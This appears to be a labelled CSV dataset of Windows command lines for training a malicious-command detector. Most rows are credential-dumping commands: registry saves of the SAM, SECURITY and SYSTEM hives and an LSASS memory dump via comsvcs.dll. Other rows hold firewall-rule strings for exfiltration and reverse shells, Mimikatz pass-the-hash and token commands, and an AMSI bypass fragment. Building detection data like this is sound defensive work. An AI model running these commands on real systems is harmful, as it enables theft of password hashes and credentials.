text,label
"powershell -nop -c ""rule: exfil data | app: any | dir: outbound | act: allow | port: 4444""",2
reg save hklm\system c:\windows\temp\m91p06zg.save,1
"powershell -nop -c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
reg export hklm\system c:\windows\temp\n5qlv18x.save,1
reg save hklm\system c:\windows\temp\3xmecqb0.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\w0nuyo2q.dat""",1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\ce23l66r.save""",1
reg save hklm\security c:\windows\temp\wb0sz5k2.save,1
reg save hklm\system c:\windows\temp\n2fewyfk.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\b00zvn10.dat""",1
reg export hklm\security c:\windows\temp\xpfevspn.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\xxzph8hn.dat""",1
reg export hklm\security c:\windows\temp\i45mrk5x.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\0pk9fvsb.dat""",1
reg save hklm\system c:\windows\temp\cozsubna.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\mdkg4j4f.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\cahvz0o6.dat""",1
reg  export  hklm\security  c:\windows\temp\gukh0cus.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\xqp69fw2.save""",1
"cmd.exe /c ""java -jar application.jar""",0
reg save hklm\sam c:\windows\temp\o4hl0chx.save,1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\ex53b95f.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\r9k1i1se.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ushgg0ow.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\mn1ikveu.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\9t8p96c9.dat""""",1
reg export hklm\system c:\windows\temp\7btiah2e.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\xje7jzxh.dat""",1
reg export hklm\security c:\windows\temp\770x0e4h.save,1
reg save hklm\security c:\windows\temp\go5zpgw7.save,1
reg save hklm\system c:\windows\temp\jzgjl891.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\y1osle4t.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\k5vdg26y.dat""",1
reg save hklm\security c:\windows\temp\g8rzkd6e.save,1
reg save hklm\sam c:\windows\temp\o8zpaef8.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\k76o1a39.dat""",1
reg save hklm\system c:\windows\temp\ewgyfvhp.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ddj6ejrn.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\bp2ptygu.dat""",1
reg save hklm\sam c:\windows\temp\0dczdwmb.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\42jtmce2.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\dmid18c4.dat""",1
reg export hklm\security c:\windows\temp\e75ve1py.save,1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\9ob80e8k.dat""",1
reg export hklm\security c:\windows\temp\yajvx2l3.save,1
reg export hklm\system c:\windows\temp\6bx1c6lg.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\87jgibf8.dat""""",1
reg save hklm\sam c:\windows\temp\xspai5a3.save,1
reg save hklm\sam c:\windows\temp\c0noujhc.save,1
reg save hklm\sam c:\windows\temp\bxfh8uq9.save,1
reg save hklm\security c:\windows\temp\dpfx0pb1.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\wk37r28k.dat""",1
reg save hklm\security c:\windows\temp\f0hneby3.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\yaygsijw.dat""",1
reg save hklm\security c:\windows\temp\nj4a7wxj.save,1
"cmd.exe /c ""rule: exfil data | app: any | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\system c:\windows\temp\ilbyp5n7.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\eywlgmq0.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\c9078g87.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\i43svwwr.dat""",1
reg save hklm\sam c:\windows\temp\qlihwgyb.save,1
reg save hklm\system c:\windows\temp\jctq5uk1.save,1
reg save hklm\security c:\windows\temp\rvwzvn4l.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\83ld6oxt.dat""",1
reg export hklm\sam c:\windows\temp\n533uk3c.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\2nvj8rzh.dat""",1
reg export hklm\security c:\windows\temp\6c1d7jqs.save,1
reg export hklm\security c:\windows\temp\j3sm6odj.save,1
reg save hklm\security c:\windows\temp\rjdurozb.save,1
reg save hklm\system c:\windows\temp\o53dk3i1.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\fhe64xt8.dat""",1
reg save hklm\security c:\windows\temp\4z0utkk0.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\m3jk0zvv.dat""",1
"cmd.exe /c ""klist   purge""",3
"cmd.exe /c ""reg save hklm\sam c:\temp\3nbpay9u.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\2a4fsith.dat""",1
"powershell -nop -c ""rundll32.exe   c:\windows\system32\comsvcs.dll,   minidump   1234   c:\temp\lsass.dmp   full""",1
"cmd.exe /c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 1337""",2
reg export hklm\sam c:\windows\temp\noaci9eo.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""reg export hklm\security c:\temp\h9y046dc.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\t99kcfyf.dat""",1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg   export   hklm\system   c:\windows\temp\al9ffpxx.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\jt74nzyf.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\6x44vu9l.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6g5fazdo.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\9ipdf2sn.dat""",1
reg export hklm\sam c:\windows\temp\223td6jx.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\sr0mzedo.dat""",1
reg export hklm\system c:\windows\temp\ypyjrgr2.save,1
whoami  /groups,0
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\sam c:\windows\temp\rf4i7uhh.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\zgy90qst.dat""",1
reg export hklm\sam c:\windows\temp\iev1ixrt.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\2j360l2e.dat""",1
reg export hklm\security c:\windows\temp\vvk6c27l.save,1
"powershell -nop -c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\rcvxv6r8.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\238h0wgk.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\1duygn8y.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\zp1cis44.dat""",1
reg save hklm\security c:\windows\temp\2b8etdmq.save,1
reg save hklm\security c:\windows\temp\exzzdmt2.save,1
reg save hklm\system c:\windows\temp\3z1jk6k6.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\jomhyprd.dat""",1
reg export hklm\security c:\windows\temp\5k1rk243.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\yjc8skdr.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\j01qw03f.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\rhfqx9lk.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\63l85a1h.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\d2tl7qy7.dat""",1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\r6e0969l.save""",1
reg export hklm\security c:\windows\temp\ifde9rbb.save,1
reg save hklm\system c:\windows\temp\3jcos2ej.save,1
reg export hklm\sam c:\windows\temp\dum11q0n.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\if5gxgq7.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\yywq8flg.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\m56t5mbt.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\8e943lol.dat""",1
reg export hklm\sam c:\windows\temp\aeoaml3o.save,1
"powershell -nop -c ""reg query hkcu\console""",0
"cmd.exe /c ""reg save hklm\security c:\temp\6tma991j.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\te1sd4gg.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\6zz49hm7.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\mdt91wsb.dat""",1
select-string -path c:\logs\app.log -pattern 'failed logon',0
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\pb7z5e8p.dat""""",1
reg save hklm\system c:\windows\temp\f49x1057.save,1
reg save hklm\system c:\windows\temp\b35zq5d7.save,1
reg save hklm\security c:\windows\temp\zokt9e2f.save,1
"powershell -nop -c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg save hklm\sam c:\windows\temp\h65yz9ph.save,1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\5nu9d9on.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\14xe5zp4.dat""",1
"cmd.exe /c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""reg export hklm\security c:\temp\dc7rrdn4.dat""",1
reg save hklm\sam c:\windows\temp\knswlcr3.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\i8vjuxd8.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\g25n75jt.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\c5ovmogh.dat""",1
reg export hklm\security c:\windows\temp\yckb3bts.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\iyj8c97z.dat""",1
reg  query  hkcu\console,0
"powershell -nop -c ""reg export hklm\sam c:\temp\hs9l18xk.dat""",1
reg export hklm\system c:\windows\temp\qctoeq84.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ebtoc974.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\owapum0e.dat""",1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
"powershell -nop -c ""reg save hklm\sam c:\temp\l2d9olu1.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\egbpnjcq.dat""",1
"cmd.exe /c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg save hklm\security c:\windows\temp\8hqaqexf.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\4nbjp3im.dat""",1
reg export hklm\system c:\windows\temp\xdqu8yr4.save,1
reg export hklm\system c:\windows\temp\sxng4h9b.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\en9irzzg.dat""",1
reg export hklm\system c:\windows\temp\vf3jtsnc.save,1
reg save hklm\system c:\windows\temp\rrm74vop.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\9k73uz69.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ntg1y9td.dat""",1
reg save hklm\security c:\windows\temp\ba04qyhx.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\5fjydhkf.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\xv9s626l.dat""",1
rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444,2
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\o7a1eotb.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\1yr9m4wh.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\8yj4aqyv.dat""",1
reg save hklm\sam c:\windows\temp\sfsrjd82.save,1
reg save hklm\security c:\windows\temp\25zwunp0.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\lt02i5at.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\ghwd9nun.dat""""",1
reg export hklm\sam c:\windows\temp\osp2vs80.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\u7jcq2oy.dat""",1
reg save hklm\security c:\windows\temp\m3kjqejd.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\r0s8oepp.dat""",1
reg export hklm\sam c:\windows\temp\gin9tfse.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\hlmtwjh4.dat""",1
reg save hklm\sam c:\windows\temp\sn7h8ymq.save,1
reg export hklm\sam c:\windows\temp\m5fcv3s3.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\iv0xxt67.dat""",1
reg export hklm\security c:\windows\temp\bd628bra.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\ky9vbmoz.dat""",1
reg save hklm\security c:\windows\temp\7d9rrgqh.save,1
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337,2
reg  export  hklm\system  c:\windows\temp\d8gh28um.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\kunax45v.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\8m4jh9z8.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\btxl4gte.dat""""",1
reg export hklm\system c:\windows\temp\f3j7yjmu.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\vsl6pill.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\bthujslo.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1yst7ezl.dat""",1
reg save hklm\sam c:\windows\temp\6sv8smom.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\bzmheq4e.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\kcvsjsy1.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\h3x9bqs5.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\kr48nalf.dat""",1
reg export hklm\system c:\windows\temp\xill84bl.save,1
reg export hklm\security c:\windows\temp\gs05zofx.save,1
reg export hklm\security c:\windows\temp\lrkd0y92.save,1
"cmd.exe /c ""sekurlsa::pth""",3
reg save hklm\security c:\windows\temp\r69klo5m.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\zdodj3it.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\6jdf02c5.dat""",1
reg export hklm\security c:\windows\temp\c19muu6e.save,1
reg export hklm\sam c:\windows\temp\6zgv8elh.save,1
reg save hklm\system c:\windows\temp\m6wis5h1.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\suc0ak0e.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\k9gpt97v.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\8ilnj47l.dat""",1
reg save hklm\sam c:\windows\temp\ktkjcfdo.save,1
reg save hklm\security c:\windows\temp\kbju8iqx.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\8s0bdwwh.dat""",1
reg  save  hklm\sam  c:\windows\temp\6ao4ye9r.save,1
"cmd.exe /c ""token::elevate""",3
"cmd.exe /c ""reg export hklm\sam c:\temp\jojukh00.dat""",1
reg export hklm\system c:\windows\temp\yhau7b44.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\b5njvprb.dat""",1
reg save hklm\security c:\windows\temp\07opt7wm.save,1
$a = [ref].assembly.gettype('system.management.automation.amsiutils'),3
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\f6fw03h2.dat""""",1
reg   save   hklm\security   c:\windows\temp\rmcjehi2.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\x2p6gzds.dat""",1
reg export hklm\security c:\windows\temp\bm98cf7h.save,1
reg save hklm\security c:\windows\temp\px85klq5.save,1
$a   =   [ref].assembly.gettype('system.management.automation.amsiutils'),3
reg export hklm\system c:\windows\temp\o6t805ty.save,1
reg save hklm\sam c:\windows\temp\14kan764.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\qx0lscn2.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\k28z4tbk.dat""",1
reg export hklm\sam c:\windows\temp\7rc2hxst.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\rxv247tm.dat""",1
reg save hklm\security c:\windows\temp\z9befen3.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\l96ka2vi.save""",1
reg save hklm\sam c:\windows\temp\r2blb9ly.save,1
reg export hklm\system c:\windows\temp\v6p5p5zv.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\0uu9qfeg.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\dnlz5ui3.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\zy7hshqh.dat""",1
reg   save   hklm\system   c:\windows\temp\18pbi95y.save,1
"rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full",1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\39ot8rzn.save""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\n1wlh6sg.dat""",1
reg export hklm\sam c:\windows\temp\dqvtnmld.save,1
reg save hklm\sam c:\windows\temp\l77k6udb.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\h9er94lt.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\0hi7y4tu.dat""",1
reg export hklm\system c:\windows\temp\btk8lzry.save,1
reg export hklm\security c:\windows\temp\jtdi8wfo.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\bli215ts.dat""",1
reg export hklm\system c:\windows\temp\aqv74eo7.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\mdulshb1.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\5p5mocgl.dat""",1
reg export hklm\security c:\windows\temp\0ksq4c8e.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\jar07swe.dat""",1
reg  save  hklm\system  c:\windows\temp\xpv11u4j.save,1
reg save hklm\system c:\windows\temp\us1melji.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\o5t3l1ro.dat""",1
reg export hklm\sam c:\windows\temp\fi2bjhe2.save,1
reg export hklm\sam c:\windows\temp\0jkxk76q.save,1
reg save hklm\security c:\windows\temp\66xglelm.save,1
"cmd.exe /c ""node server.js --port 3000""",0
"powershell -nop -c ""reg export hklm\sam c:\temp\r6bzcjhk.dat""",1
reg save hklm\security c:\windows\temp\bcb2r39a.save,1
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\ofxrjper.save""",1
"wmic  product  get  name,  version",0
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\0d4bzbxd.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\tnq4c1bm.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\4co57s0e.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\6peuoplk.dat""""",1
"cmd.exe /c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 1337""",2
"powershell -nop -c ""reg save hklm\security c:\temp\ahbzrd0m.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\f4y8nhmi.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\5xkgdmjy.dat""",1
reg save hklm\security c:\windows\temp\lodvqpfv.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\zdylhfyc.dat""",1
reg export hklm\system c:\windows\temp\djeyqubo.save,1
reg export hklm\system c:\windows\temp\8abus034.save,1
backup-utility  save  registry  config,0
reg export hklm\sam c:\windows\temp\9fh0p21h.save,1
reg   save   hklm\security   c:\windows\temp\97mm93xr.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\mwp2v7fz.dat""",1
reg save hklm\sam c:\windows\temp\d1t3cmrx.save,1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\ql73590f.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\lj9cgl5h.dat""",1
reg export hklm\system c:\windows\temp\9rtlcdg5.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ngjmq7or.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\o8m2wiak.dat""",1
reg save hklm\system c:\windows\temp\ugcpyqf4.save,1
reg export hklm\sam c:\windows\temp\st419650.save,1
reg export hklm\sam c:\windows\temp\yuf49z2f.save,1
